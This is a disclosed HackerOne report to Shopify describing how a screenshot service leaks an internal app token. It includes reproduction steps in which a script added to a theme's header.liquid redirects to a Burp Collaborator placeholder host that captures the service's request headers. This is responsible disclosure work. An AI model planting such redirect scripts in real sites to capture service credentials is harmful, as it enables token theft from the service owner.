# Screenshot Service leaks X-ABS-App-Token

## Report Details
- **Report ID**: 1067443
- **URL**: https://hackerone.com/reports/1067443
- **State**: Closed
- **Severity**: none
- **Submitted**: 2020-12-28T13:13:15.641Z
- **Disclosed**: 2021-02-12T12:44:23.524Z

## Reporter
- **Username**: corraldev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
1. Login and create a development store
2. Start Burp Suite and open a burp collaborator client then copy the collaborator payload
3. Edit the section header.liquid of your current theme. Adding this:

````
<script>
  window.location="https://[paste_here_collaborator]/";
</script>

````
Finally go to https://your-store.myshopify.com/admin/themes , in your collaborator client you should be able to read the server request

## Impact

This SSRF expose `X-ABS-App-Token: screenshot-service-production@████████` . 
Fortunately when you load another location than the preview page of your shop the screenshot isn't taken but can open the door to another vulnerabilities.

## Attachments
No attachments
